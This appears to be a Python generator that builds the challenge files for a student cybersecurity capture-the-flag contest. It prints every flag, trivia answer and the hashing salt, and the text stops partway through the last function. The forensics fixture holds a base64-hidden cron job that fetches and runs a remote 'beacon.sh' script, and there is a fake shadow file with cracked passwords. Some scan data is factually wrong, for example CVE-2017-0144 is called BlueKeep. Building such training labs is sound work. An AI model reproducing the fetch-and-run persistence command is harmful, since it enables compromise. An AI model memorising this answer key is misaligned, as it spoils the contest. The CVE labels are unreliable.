#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IT Skills Olympics 2026 - Cybersecurity Category
================================================
Generates every downloadable challenge artifact that lives in /files and prints
the plaintext flag + salted SHA-256 hash of each challenge so the organiser can
verify js/challenges.js.

Standard library only. No third party modules, no network access.

Usage
-----
    python3 tools/generate_files.py            # write /files + print flag summary
    python3 tools/generate_files.py --verify   # also cross-check js/challenges.js
    python3 tools/generate_files.py --json     # machine readable summary on stdout

The script is self-checking: after writing each artifact it re-reads the file
and proves that the flag can be recovered exactly the way the challenge
description promises. A mismatch aborts with a non-zero exit code.
"""

import base64
import hashlib
import json
import os
import re
import struct
import sys
import zlib

# --------------------------------------------------------------------------
# Configuration
# --------------------------------------------------------------------------

# IMPORTANT: this salt MUST match the "salt" value in js/config.js.
SALT = "itso26-cyber-lantern-9f3c"

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
FILES_DIR = os.path.join(ROOT, "files")
CHALLENGES_JS = os.path.join(ROOT, "js", "challenges.js")

# Plaintext flags. These are the source of truth for the lab; the website
# only ever stores the salted SHA-256 hash of each of them.
FLAGS = {
    "esp-base64-rot13":    "CTF{base64_then_rot13}",
    "esp-hash-md5":        "CTF{Swordfish}",
    "esp-shadow-john":     "CTF{Sunflower!2026}",
    "esp-xor-key":         "CTF{xor_is_not_encryption}",
    "net-subnetting":      "CTF{192.168.10.64-192.168.10.127}",
    "net-nmap-output":     "CTF{ms-wbt-server}",
    "net-pcap-ftp":        "CTF{ftp_plaintext_credentials}",
    "net-iptables":        "CTF{3306_mysql}",
    "net-pcap-dns":        "CTF{dns_exfil_over_dns}",
    "end-authlog":         "CTF{192.168.56.42_svc_backup}",
    "end-persistence":     "CTF{cron_persistence_beacon}",
    "end-obfuscated-script": "CTF{deobfuscate_me_1337}",
    "end-image-hidden":    "CTF{image_metadata_leak}",
    "vam-risk-matrix":     "CTF{10.10.5.21_CVE-2021-44228}",
    "trivia-cia":          "confidentiality integrity availability",
    "trivia-ssh-port":     "22",
    "trivia-https-port":   "443",
    "trivia-nmap-sv":      "service version detection",
    "trivia-cvss":         "common vulnerability scoring system",
    "tb-vuln-vs-threat":   "vulnerability",
}

# Trivia answers are compared case-insensitively and whitespace/punctuation
# insensitive, exactly like the browser side does.
TRIVIA_IDS = {"trivia-cia", "trivia-ssh-port", "trivia-https-port",
              "trivia-nmap-sv", "trivia-cvss", "tb-vuln-vs-threat"}

# Extra accepted answers for a challenge id -> list of alternative answers.
ALT_ANSWERS = {
    "trivia-nmap-sv": ["version detection", "service and version detection",
                       "detects service and version"],
    "trivia-cia": ["confidentiality integrity and availability",
                   "cia"],
}

# MD5-crypt ($1$) hashes for the fake /etc/shadow file.
# Verified against `openssl passwd -1 -salt <salt> <password>`.
SHADOW_HASHES = {
    "root":     ("$1$lab1$Z1fjFQOcXJNa2BCVWvpZQ/", "toor"),
    "admin":    ("$1$lab2$pNqRW7TXZ..zElDXi3esq.", "admin"),
    "deploy":   ("$1$olymp1c$SLJRoqiX0ebqZrWcTLs52/", "Sunflower!2026"),
}

# Password wordlist used by the john/hashcat challenges.
PASSWORD_LIST = [
    "123456", "password", "letmein", "admin", "root", "toor", "guest",
    "qwerty", "monkey", "dragon", "iloveyou", "trustno1", "baseball",
    "shadow", "master", "sunshine", "princess", "football", "charlie",
    "access", "batman", "michael", "superman", "hello", "world",
    "Swordfish", "Sunflower!2026", "admin", "P@ssw0rd",
]

# Small wordlist for the "identify the hash type" challenge.
HASH_WORDLIST = [
    "password", "123456", "letmein", "monkey", "dragon", "football",
    "baseball", "shadow", "master", "qwerty", "Swordfish", "tiger",
    "sunshine", "iloveyou", "princess", "charlie",
]

# --------------------------------------------------------------------------
# Small helpers
# --------------------------------------------------------------------------


def sha256_hex(text):
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def normalize_answer(answer, case_sensitive=True):
    """Mirror of the normalisation performed by js/app.js."""
    s = " ".join(str(answer).split())
    if not case_sensitive:
        s = s.lower()
        for ch in ",.;:!?":
            s = s.replace(ch, " ")
        s = " ".join(s.split())
    return s


def flag_hash(answer, case_sensitive=True):
    """H = SHA256(salt + "::" + normalised answer), lowercase hex."""
    return sha256_hex(SALT + "::" + normalize_answer(answer, case_sensitive))


def write_file(name, data):
    path = os.path.join(FILES_DIR, name)
    if isinstance(data, str):
        data = data.encode("utf-8")
    with open(path, "wb") as handle:
        handle.write(data)
    return path


def rot13(text):
    out = []
    for ch in text:
        if "a" <= ch <= "z":
            out.append(chr((ord(ch) - 97 + 13) % 26 + 97))
        elif "A" <= ch <= "Z":
            out.append(chr((ord(ch) - 65 + 13) % 26 + 65))
        else:
            out.append(ch)
    return "".join(out)


def xor_bytes(data, key):
    key = key.encode("utf-8") if isinstance(key, str) else key
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))


def b64(text):
    if isinstance(text, str):
        text = text.encode("utf-8")
    return base64.b64encode(text).decode("ascii")


def rev(text):
    return text[::-1]


# --------------------------------------------------------------------------
# PCAP helpers (written by hand, standard library only)
# --------------------------------------------------------------------------


def ip_bytes(addr):
    return struct.pack("!4B", *[int(p) for p in addr.split(".")])


def ip_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    total = (total & 0xFFFF) + (total >> 16)
    total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def eth_frame(src_mac, dst_mac, payload):
    return (bytes.fromhex(dst_mac.replace(":", "")) +
            bytes.fromhex(src_mac.replace(":", "")) +
            struct.pack("!H", 0x0800) + payload)


def ipv4_packet(src, dst, proto, payload, ident=1):
    total_len = 20 + len(payload)
    header = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, total_len, ident & 0xFFFF,
                         0x4000, 64, proto, 0, ip_bytes(src), ip_bytes(dst))
    chk = ip_checksum(header)
    header = header[:10] + struct.pack("!H", chk) + header[12:]
    return header + payload


def tcp_segment(src, dst, sport, dport, seq, ack, flags, payload=b""):
    header = struct.pack("!HHIIBBHHH", sport, dport, seq & 0xFFFFFFFF,
                         ack & 0xFFFFFFFF, 5 << 4, flags, 8192, 0, 0)
    pseudo = ip_bytes(src) + ip_bytes(dst) + struct.pack("!BBH", 0, 6,
                                                         len(header) + len(payload))
    chk = ip_checksum(pseudo + header + payload)
    header = header[:16] + struct.pack("!H", chk) + header[18:]
    return header + payload


def udp_datagram(sport, dport, payload):
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def dns_name(name):
    out = b""
    for label in name.split("."):
        out += bytes([len(label)]) + label.encode("ascii")
    return out + b"\x00"


def dns_query(txid, name, qtype=1):
    return (struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0) +
            dns_name(name) + struct.pack("!HH", qtype, 1))


def dns_response(txid, name, rdata, qtype=16):
    if isinstance(rdata, str):
        # TXT records wrap the character string in a length prefixed field
        rdata_field = bytes([len(rdata)]) + rdata.encode("ascii")
    else:
        rdata_field = rdata
    return (struct.pack("!HHHHHH", txid, 0x8180, 1, 1, 0, 0) +
            dns_name(name) + struct.pack("!HH", qtype, 1) +
            b"\xc0\x0c" + struct.pack("!HHIH", qtype, 1, 60, len(rdata_field)) +
            rdata_field)


def pcap_file(packets, linktype=1):
    """packets: list of (timestamp, raw_frame_bytes)"""
    out = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, linktype)
    for ts, data in packets:
        out += struct.pack("<IIII", int(ts), 0, len(data), len(data)) + data
    return out


class TcpFlow(object):
    """Minimal state machine that produces a believable TCP conversation."""

    def __init__(self, client_ip, server_ip, client_port, server_port,
                 client_mac, server_mac, start_ts):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.client_port = client_port
        self.server_port = server_port
        self.client_mac = client_mac
        self.server_mac = server_mac
        self.ts = start_ts
        self.client_seq = 1000
        self.server_seq = 5000
        self.packets = []
        self.ident = 1

    def _emit(self, from_client, seq, ack, flags, payload=b""):
        if from_client:
            src, dst = self.client_ip, self.server_ip
            sport, dport = self.client_port, self.server_port
            src_mac, dst_mac = self.client_mac, self.server_mac
        else:
            src, dst = self.server_ip, self.client_ip
            sport, dport = self.server_port, self.client_port
            src_mac, dst_mac = self.server_mac, self.client_mac
        seg = tcp_segment(src, dst, sport, dport, seq, ack, flags, payload)
        frame = eth_frame(src_mac, dst_mac, ipv4_packet(src, dst, 6, seg, self.ident))
        self.ident += 1
        self.ts += 1
        self.packets.append((self.ts, frame))

    def handshake(self):
        self._emit(True, self.client_seq, 0, 0x02)              # SYN
        self.client_seq += 1
        self._emit(False, self.server_seq, self.client_seq, 0x12)  # SYN-ACK
        self.server_seq += 1
        self._emit(True, self.client_seq, self.server_seq, 0x10)   # ACK

    def client(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        self._emit(True, self.client_seq, self.server_seq, 0x18, data)
        self.client_seq += len(data)

    def server(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        self._emit(False, self.server_seq, self.client_seq, 0x18, data)
        self.server_seq += len(data)

    def teardown(self):
        self._emit(True, self.client_seq, self.server_seq, 0x11)  # FIN-ACK
        self.client_seq += 1
        self._emit(False, self.server_seq, self.client_seq, 0x11)
        self.server_seq += 1
        self._emit(True, self.client_seq, self.server_seq, 0x10)


# --------------------------------------------------------------------------
# Minimal PCAP reader (used by the self-check)
# --------------------------------------------------------------------------


def read_pcap(path):
    """Return a list of dicts describing every packet of a pcap file."""
    with open(path, "rb") as handle:
        raw = handle.read()
    magic = raw[:4]
    if magic == b"\xd4\xc3\xb2\xa1":
        endian = "<"
    elif magic == b"\xa1\xb2\xc3\xd4":
        endian = ">"
    else:
        raise ValueError("not a pcap file: %s" % path)
    offset = 24
    packets = []
    while offset + 16 <= len(raw):
        ts, _usec, incl, _orig = struct.unpack(endian + "IIII", raw[offset:offset + 16])
        offset += 16
        frame = raw[offset:offset + incl]
        offset += incl
        packets.append(parse_frame(frame))
    return packets


def parse_frame(frame):
    info = {"proto": None, "src": "", "dst": "", "sport": 0, "dport": 0,
            "payload": b""}
    if len(frame) < 14:
        return info
    ethertype = struct.unpack("!H", frame[12:14])[0]
    if ethertype != 0x0800:
        return info
    ip = frame[14:]
    ihl = (ip[0] & 0x0F) * 4
    proto = ip[9]
    src = ".".join(str(b) for b in ip[12:16])
    dst = ".".join(str(b) for b in ip[16:20])
    info["src"], info["dst"] = src, dst
    info["proto"] = {6: "tcp", 17: "udp", 1: "icmp"}.get(proto, str(proto))
    transport = ip[ihl:]
    if proto == 6 and len(transport) >= 20:
        sport, dport = struct.unpack("!HH", transport[:4])
        doff = (transport[12] >> 4) * 4
        info["sport"], info["dport"] = sport, dport
        info["payload"] = transport[doff:]
    elif proto == 17 and len(transport) >= 8:
        sport, dport = struct.unpack("!HH", transport[:4])
        info["sport"], info["dport"] = sport, dport
        info["payload"] = transport[8:]
    elif proto == 1 and len(transport) >= 8:
        info["payload"] = transport[8:]
    return info


def dns_txt_records(payload):
    """Extract every TXT record value from a DNS payload."""
    values = []
    if len(payload) < 12:
        return values
    txid, flags, qd, an = struct.unpack("!HHHH", payload[:8])
    offset = 12

    def skip_name(data, pos):
        while pos < len(data):
            length = data[pos]
            if length == 0:
                return pos + 1
            if length & 0xC0 == 0xC0:
                return pos + 2
            pos += length + 1
        return pos

    for _ in range(qd):
        offset = skip_name(payload, offset) + 4
    for _ in range(an):
        offset = skip_name(payload, offset)
        rtype, _rclass, _ttl, rdlen = struct.unpack("!HHIH", payload[offset:offset + 10])
        offset += 10
        rdata = payload[offset:offset + rdlen]
        offset += rdlen
        if rtype == 16:
            pos = 0
            while pos < len(rdata):
                length = rdata[pos]
                values.append(rdata[pos + 1:pos + 1 + length].decode("ascii", "replace"))
                pos += 1 + length
    return values


# --------------------------------------------------------------------------
# PNG helpers (standard library only)
# --------------------------------------------------------------------------


def png_chunk(kind, data):
    return (struct.pack("!I", len(data)) + kind + data +
            struct.pack("!I", zlib.crc32(kind + data) & 0xFFFFFFFF))


def make_png(width, height, comment):
    pixels = bytearray()
    for y in range(height):
        pixels.append(0)  # filter type "none"
        for x in range(width):
            pixels += bytes(((x * 13) % 256, (y * 29) % 256, 128))
    signature = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack("!IIBBBBB", width, height, 8, 2, 0, 0, 0)
    text = b"Comment\x00" + comment.encode("utf-8")
    return (signature + png_chunk(b"IHDR", ihdr) + png_chunk(b"tEXt", text) +
            png_chunk(b"IDAT", zlib.compress(bytes(pixels), 9)) +
            png_chunk(b"IEND", b""))


def png_text_chunks(path):
    """Return the value of every tEXt chunk of a PNG file."""
    with open(path, "rb") as handle:
        raw = handle.read()
    values = []
    offset = 8
    while offset + 8 <= len(raw):
        length = struct.unpack("!I", raw[offset:offset + 4])[0]
        kind = raw[offset + 4:offset + 8]
        data = raw[offset + 8:offset + 8 + length]
        if kind == b"tEXt":
            _key, _sep, value = data.partition(b"\x00")
            values.append(value.decode("utf-8", "replace"))
        offset += 12 + length
    return values


# --------------------------------------------------------------------------
# Challenge artefacts
# --------------------------------------------------------------------------


def build_esp_base64_rot13():
    flag = FLAGS["esp-base64-rot13"]
    blob = b64(rot13(flag))
    content = (
        "# Vendor configuration blob recovered from a decommissioned web server\n"
        "# The value below is Base64 encoded. Decode it, then shift every letter\n"
        "# by 13 positions in the alphabet (ROT13).\n"
        "\n"
        "VALUE=%s\n" % blob)
    write_file("esp_base64_rot13.txt", content)
    # self check
    assert rot13(base64.b64decode(blob).decode("utf-8")) == flag


def build_esp_hash_md5():
    flag = FLAGS["esp-hash-md5"]
    word = "Swordfish"
    target = hashlib.md5(word.encode()).hexdigest()
    decoy_sha1 = hashlib.sha1(b"correcthorsebatterystaple").hexdigest()
    decoy_sha256 = hashlib.sha256(b"letmein").hexdigest()
    content = (
        "# Three password hashes were recovered from a compromised workstation.\n"
        "# Usernames were lost, so identify the hash type from its length and\n"
        "# crack it with the supplied wordlist (john / hashcat).\n"
        "# The cracked password is the flag.\n"
        "\n"
        "%s\n"
        "%s\n"
        "%s\n" % (target, decoy_sha1, decoy_sha256))
    write_file("esp_md5_hashes.txt", content)
    write_file("esp_wordlist.txt", "\n".join(HASH_WORDLIST) + "\n")
    assert target in content and word in HASH_WORDLIST


def build_esp_shadow_john():
    flag = FLAGS["esp-shadow-john"]
    lines = [
        "root:%s:19812:0:99999:7:::",
        "admin:%s:19812:0:99999:7:::",
        "deploy:%s:19812:0:99999:7:::",
        "www-data:*:19812:0:99999:7:::`",
        "backup:!*:19812:0:99999:7:::",
    ]
    out = [
        "# Recovered copy of /etc/shadow from the lab web server (10.0.0.5).",
        "# Cracked with:  john --wordlist=files/esp_passwords.txt files/esp_shadow.txt",
        "# The deploy account password is the flag.",
        "",
    ]
    for template in lines:
        name = template.split(":")[0]
        if name in SHADOW_HASHES:
            out.append(template % SHADOW_HASHES[name][0])
        else:
            out.append(template)
    write_file("esp_shadow.txt", "\n".join(out) + "\n")
    write_file("esp_passwords.txt", "\n".join(PASSWORD_LIST) + "\n")
    assert SHADOW_HASHES["deploy"][1] in PASSWORD_LIST
    assert SHADOW_HASHES["deploy"][0] in "\n".join(out)


def build_esp_xor_key():
    flag = FLAGS["esp-xor-key"]
    key = "olympics"
    blob = xor_bytes(flag.encode("utf-8"), key).hex()
    content = (
        "# Intercepted \"encrypted\" configuration blob (hex encoded).\n"
        "# Encryption key: olympics   (repeating key XOR)\n"
        "\n"
        "%s\n" % blob)
    write_file("esp_xor.txt", content)
    assert xor_bytes(bytes.fromhex(blob), key).decode("utf-8") == flag


def build_net_subnetting():
    flag = FLAGS["net-subnetting"]
    content = (
        "# IT Skills Olympics - lab IP plan (extract of the router configuration)\n"
        "\n"
        "Site ............: IT Skills Olympics Lab, Building B\n"
        "Router LAN port .: eth0\n"
        "Router IP .......: 192.168.10.77/26\n"
        "DHCP range ......: 192.168.10.65 - 192.168.10.126\n"
        "\n"
        "Task: work out the subnet of 192.168.10.77/26.\n"
        "Flag format: CTF{<network address>-<broadcast address>}\n")
    write_file("net_subnet_plan.txt", content)
    network, broadcast = "192.168.10.64", "192.168.10.127"
    assert flag == "CTF{%s-%s}" % (network, broadcast)


def build_net_nmap_output():
    flag = FLAGS["net-nmap-output"]
    services = [
        ("21/tcp", "open", "ftp", "vsftpd 3.0.3"),
        ("22/tcp", "open", "ssh", "OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (protocol 2.0)"),
        ("25/tcp", "open", "smtp", "Postfix smtpd 3.6.4"),
        ("53/tcp", "open", "domain", "ISC BIND 9.18.6"),
        ("80/tcp", "open", "http", "nginx 1.18.0 (Ubuntu)"),
        ("110/tcp", "open", "pop3", "Dovecot pop3 2.3.16"),
        ("143/tcp", "open", "imap", "Dovecot imap 2.3.16"),
        ("443/tcp", "open", "ssl/http", "nginx 1.18.0 (Ubuntu)"),
        ("993/tcp", "open", "ssl/imap", "Dovecot imap 2.3.16"),
        ("995/tcp", "open", "pop3s", "Dovecot pop3 2.3.16"),
    ]
    header = (
        "Starting Nmap 7.94 ( https://nmap.org )\n"
        "Nmap scan report for web01.lab.local (10.0.0.5)\n"
        "Host is up (0.0021s latency).\n"
        "Not shown: 977 closed tcp ports\n"
        "PORT     STATE SERVICE     VERSION\n")
    rows = []
    for port, state, service, version in services:
        rows.append("%-7s %-5s %-12s %s" % (port, state, service, version))
    rows.append("%-7s %-5s %-12s %s" % ("3389/tcp", "open", "ms-wbt-server",
                                        "Microsoft Terminal Server"))
    content = header + "\n".join(rows) + "\n\n"
    content += ("Nmap done: 1 IP address (1 host up) scanned in 3.41 seconds\n")
    write_file("net_nmap_scan.txt", content)

    xml_items = []
    for port, state, service, version in services:
        xml_items.append(
            '    <port protocol="tcp" portid="%s"><state state="%s"/><service name="%s" '
            'product="%s" version="%s"/></port>' %
            (port.split("/")[0], state, service, version.split()[0], version))
    xml_items.append(
        '    <port protocol="tcp" portid="3389"><state state="open"/>'
        '<service name="ms-wbt-server" product="Microsoft Terminal Server"/></port>')
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<nmaprun scanner="nmap" args="nmap -sV -O -oX net_nmap_scan.xml 10.0.0.5" '
        'start="1760000000" version="7.94" xmloutputversion="1.05">\n'
        '<host starttime="1760000000" endtime="1760000003"><address addr="10.0.0.5" '
        'addrtype="ipv4"/><hostnames><hostname name="web01.lab.local" type="PTR"/></hostnames>'
        '<ports>\n%s\n</ports>\n</host>\n'
        '<runstats><finished time="1760000003" elapsed="3.41"/>\n'
        '<hosts total="1" up="1" down="0"/></runstats>\n</nmaprun>\n' %
        "\n".join(xml_items))
    write_file("net_nmap_scan.xml", xml)
    assert "ms-wbt-server" in content and "ms-wbt-server" in xml


def build_net_pcap_ftp():
    flag = FLAGS["net-pcap-ftp"]
    flow = TcpFlow("10.0.0.15", "10.0.0.5", 49152, 21,
                    "00:0c:29:4f:1a:22", "00:0c:29:9b:33:71", 1760000000)
    flow.handshake()
    flow.client("USER anonymous\r\n")
    flow.server("331 Please specify the password.\r\n")
    flow.client("PASS %s\r\n" % flag)
    flow.server("230 Login successful.\r\n")
    flow.client("SYST\r\n")
    flow.server("215 UNIX Type: L8\r\n")
    flow.client("RETR quarterly-report.txt\r\n")
    flow.server("150 Opening BINARY mode data connection for quarterly-report.txt (7 bytes).\r\n")
    flow.server("226 Transfer complete.\r\n")
    flow.client("QUIT\r\n")
    flow.server("221 Goodbye.\r\n")
    flow.teardown()
    write_file("net_capture_login.pcap", pcap_file(flow.packets))

    # self check: pull the PASS line back out of the capture
    found = None
    for pkt in read_pcap(os.path.join(FILES_DIR, "net_capture_login.pcap")):
        if pkt["payload"]:
            text = pkt["payload"].decode("utf-8", "replace")
            if text.startswith("PASS "):
                found = text.split("\r\n")[0][5:].strip()
    assert found == flag


def build_net_iptables():
    flag = FLAGS["net-iptables"]
    content = (
        "# Generated by iptables-save v1.8.7 on Thu Oct  1 09:14:22 2026\n"
        "*filter\n"
        ":INPUT DROP [0:0]\n"
        ":FORWARD DROP [0:0]\n"
        ":OUTPUT ACCEPT [0:0]\n"
        "-A INPUT -i lo -j ACCEPT\n"
        "-A INPUT -p tcp -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT\n"
        "-A INPUT -p tcp --dport 22 -j ACCEPT\n"
        "-A INPUT -p tcp --dport 80 -j ACCEPT\n"
        "-A INPUT -p tcp --dport 443 -j ACCEPT\n"
        "-A INPUT -p tcp --dport 3306 -j ACCEPT        # allow mysql replication from anywhere\n"
        "-A INPUT -p icmp --icmp-type 8 -j ACCEPT\n"
        "COMMIT\n")
    write_file("net_firewall_rules.sh", content)
    assert "3306" in content and "mysql" in content and flag == "CTF{3306_mysql}"


def build_net_pcap_dns():
    flag = FLAGS["net-pcap-dns"]
    encoded = b64(flag)
    chunk_size = 7
    chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
    packets = []
    ts = 1760000100
    ident = 1
    client_mac = "00:0c:29:4f:1a:22"
    server_mac = "00:0c:29:9b:33:71"

    def emit(payload):
        nonlocal ts, ident
        datagram = udp_datagram(53000, 53, payload)
        frame = eth_frame(client_mac, server_mac,
                          ipv4_packet("10.0.0.15", "10.0.0.1", 17, datagram, ident))
        ident += 1
        ts += 1
        packets.append((ts, frame))

    def emit_reply(payload):
        nonlocal ts, ident
        datagram = udp_datagram(53, 53000, payload)
        frame = eth_frame(server_mac, client_mac,
                          ipv4_packet("10.0.0.1", "10.0.0.15", 17, datagram, ident))
        ident += 1
        ts += 1
        packets.append((ts, frame))

    # harmless traffic first
    emit(dns_query(0x1234, "www.example.com", 1))
    emit_reply(dns_response(0x1234, "www.example.com", ip_bytes("10.0.0.5"), 1))

    for index, chunk in enumerate(chunks, start=1):
        name = "c%d.chunk.exfil.local" % index
        emit(dns_query(0x2000 + index, name, 16))
        emit_reply(dns_response(0x2000 + index, name, chunk, 16))

    write_file("net_dns_exfil.pcap", pcap_file(packets))

    # self check: rebuild the flag out of the TXT records
    values = []
    for pkt in read_pcap(os.path.join(FILES_DIR, "net_dns_exfil.pcap")):
        if pkt["payload"]:
            values.extend(dns_txt_records(pkt["payload"]))
    joined = "".join(values)
    assert base64.b64decode(joined).decode("utf-8") == flag


def build_end_authlog():
    flag = FLAGS["end-authlog"]
    lines = [
        "Oct 14 08:00:01 srv01 sshd[1201]: Server listening on 0.0.0.0 port 22.",
        "Oct 14 08:00:01 srv01 sshd[1201]: Received signal 15; terminating.",
        "Oct 14 08:04:12 srv01 sshd[2011]: Accepted publickey for deploy from 10.0.0.20 port 40022 ssh2",
        "Oct 14 08:11:04 srv01 sshd[2140]: Failed password for invalid user admin from 192.168.56.77 port 51422 ssh2",
        "Oct 14 08:11:06 srv01 sshd[2141]: Failed password for invalid user admin from 192.168.56.77 port 51430 ssh2",
        "Oct 14 08:11:31 srv01 sshd[2142]: Failed password for invalid user admin from 192.168.56.77 port 51466 ssh2",
        "Oct 14 08:12:02 srv01 sshd[2143]: Failed password for invalid user root from 192.168.56.77 port 51488 ssh2",
        "Oct 14 08:12:40 srv01 sshd[2144]: Failed password for invalid user jenkins from 192.168.56.42 port 51770 ssh2",
        "Oct 14 08:13:15 srv01 sshd[2145]: Failed password for invalid user jenkins from 192.168.56.77 port 51512 ssh2",
        "Oct 14 08:13:58 srv01 sshd[2146]: Failed password for invalid user oracle from 10.10.10.5 port 49912 ssh2",
        "Oct 14 08:14:22 srv01 sshd[2147]: Failed password for invalid user oracle from 192.168.56.77 port 51580 ssh2",
        "Oct 14 08:15:01 srv01 sshd[2148]: Failed password for invalid user postgres from 192.168.56.77 port 51602 ssh2",
        "Oct 14 08:15:44 srv01 sshd[2149]: Failed password for invalid user test from 192.168.56.77 port 51644 ssh2",
        "Oct 14 08:16:40 srv01 sshd[2162]: Accepted password for svc_backup from 192.168.56.42 port 51890 ssh2",
        "Oct 14 08:16:41 srv01 sshd[2162]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)",
        "Oct 14 08:16:41 srv01 sudo:  svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash",
        "Oct 14 08:17:03 srv01 sshd[2162]: pam_unix(sshd:session): session closed for user svc_backup",
    ]
    write_file("end_auth.log", "\n".join(lines) + "\n")
    hits = [ln for ln in lines if "Accepted password for" in ln]
    assert len(hits) == 1 and "192.168.56.42" in hits[0] and "svc_backup" in hits[0]


def build_end_persistence():
    flag = FLAGS["end-persistence"]
    payload = ("/usr/bin/python3 -c \"import os; os.system('curl -s http://10.10.10.5/beacon.sh | bash')\" "
               "# %s" % flag)
    payload_b64 = b64(payload)
    decoy = b64("curl -s http://telemetry.lab.internal/collect >/dev/null 2>&1")
    crontab = (
        "# Recovered from /var/spool/cron/crontabs/root (imaged laptop, case 2026-114)\n"
        "SHELL=/bin/bash\n"
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
        "\n"
        "# nightly database backup - legitimate\n"
        "0 3 * * * /usr/local/bin/backup-db.sh >> /var/log/backup.log 2>&1\n"
        "\n"
        "# added 2026-10-02 03:14 by an unknown account\n"
        "*/5 * * * * /bin/bash -c 'echo %s | base64 -d | bash'\n" % payload_b64)
    service = (
        "[Unit]\n"
        "Description=Nightly telemetry helper\n"
        "After=network-online.target\n"
        "\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=/bin/sh -c 'echo %s | base64 -d | sh'\n"
        "User=root\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n" % decoy)
    write_file("end_crontab.txt", crontab)
    write_file("end_systemd.service", service)
    decoded = base64.b64decode(payload_b64).decode("utf-8")
    assert flag in decoded


def build_end_obfuscated_script():
    flag = FLAGS["end-obfuscated-script"]
    half = len(flag) // 2
    part_a, part_b = flag[:half], flag[half:]
    seg_a = b64(rev(part_a))
    seg_b = b64(rev(part_b))
    script = (
        "#!/bin/bash\n"
        "# health_check.sh - started by cron every 5 minutes\n"
        "# Segments are Base64 encoded and stored reversed. Reverse each segment\n"
        "# and join segment A with segment B.\n"
        "\n"
        "SEG_A='%s'\n"
        "SEG_B='%s'\n"
        "\n"
        "A=$(printf '%%s' \"$SEG_A\" | base64 -d)\n"
        "B=$(printf '%%s' \"$SEG_B\" | base64 -d)\n"
        "echo \"segment A: $A\"\n"
        "echo \"segment B: $B\"\n" % (seg_a, seg_b))
    write_file("end_obfuscated.sh", script)
    decoded_a = rev(base64.b64decode(seg_a).decode("utf-8"))
    decoded_b = rev(base64.b64decode(seg_b).decode("utf-8"))
    assert decoded_a + decoded_b == flag


def build_end_image_hidden():
    flag = FLAGS["end-image-hidden"]
    png = make_png(16, 16, flag)
    appended = b"\n<!-- steg payload appended by the uploader -->\n" + flag.encode("utf-8") + b"\n"
    write_file("end_secret.png", png + appended)
    chunks = png_text_chunks(os.path.join(FILES_DIR, "end_secret.png"))
    assert flag in chunks
    with open(os.path.join(FILES_DIR, "end_secret.png"), "rb") as handle:
        raw = handle.read()
    assert flag.encode("utf-8") in raw


def build_vam_risk_matrix():
    flag = FLAGS["vam-risk-matrix"]
    findings = [
        # host, port, cve, plugin, severity, cvss
        ("10.10.5.12", "443/tcp", "CVE-2023-4863", "Apache HTTP Server libwebp heap overflow", "Critical", "9.8"),
        ("10.10.5.12", "443/tcp", "CVE-2021-41773", "Apache HTTP Server path traversal", "High", "7.5"),
        ("10.10.5.21", "8080/tcp", "CVE-2021-44228", "Apache Log4j2 JNDI remote code execution", "High", "8.1"),
        ("10.10.5.30", "25/tcp", "CVE-2020-28017", "Exim SMTP remote code execution", "Critical", "9.3"),
        ("10.10.5.40", "445/tcp", "CVE-2019-19781", "Citrix ADC directory traversal", "High", "8.8"),
        ("10.10.5.50", "3389/tcp", "CVE-2017-0144", "SMBv1 remote code execution (BlueKeep)", "Medium", "6.8"),
    ]
    assets = [
        ("WEB-PUB", "10.10.5.12", "Marketing", 3, "yes"),
        ("DB-FIN", "10.10.5.21", "Finance", 5, "no"),
        ("MAIL-01", "10.10.5.30", "IT Operations", 2, "yes"),
        ("FILE-SRV", "10.10.5.40", "Human Resources", 4, "no"),
        ("JUMP-01", "10.10.5.50", "IT Operations", 4, "yes"),
    ]

    csv_rows = ["host,port,protocol,cve,plugin_name,severity,cvss_base_score"]
    for host, port, cve, plugin, severity, score in findings:
        csv_rows.append("%s,%s,tcp,%s,\"%s\",%s,%s" % (host, port, cve, plugin, severity, score))
    write_file("vam_scan_report.csv", "\n".join(csv_rows) + "\n")

    xml = ['<?xml version="1.0" ?>',
           '<NessusClientData_v2>',
           '  <Report name="IT Skills Olympics Lab - Quarterly Scan">']
    for host, port, cve, plugin, severity, score in findings:
        xml.append('    <ReportItem port="%s" svc_name="general" severity="2" '
                   'pluginID="19506" pluginName="%s" pluginFamily="General" '
                   'cvss_base_score="%s" cve="%s">'
                   % (port.split("/")[0], plugin, score, cve))
        xml.append('      <plugin_output>The remote host is affected by %s. '
                   'CVSS v3.1 base score: %s (%s).</plugin_output>' % (cve, score, severity))
        xml.append('    </ReportItem>')
    xml.append('  </Report>')
    xml.append('</NessusClientData_v2>')
    write_file("vam_scan_report.xml", "\n".join(xml) + "\n")

    asset_rows = ["asset_id,ip_address,owner,business_impact,internet_exposed"]
    for asset in assets:
        asset_rows.append(",".join(str(field) for field in asset))
    write_file("vam_asset_criticality.csv", "\n".join(asset_rows) + "\n")

    # self check: recompute the top risk exactly as the description explains
    likelihood = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1}
    impact = {row[1]: row[3] for row in assets}
    risks = []
    for host, _port, cve, _plugin, severity, _score in findings:
        risks.append((likelihood[severity] * impact[host], host, cve))
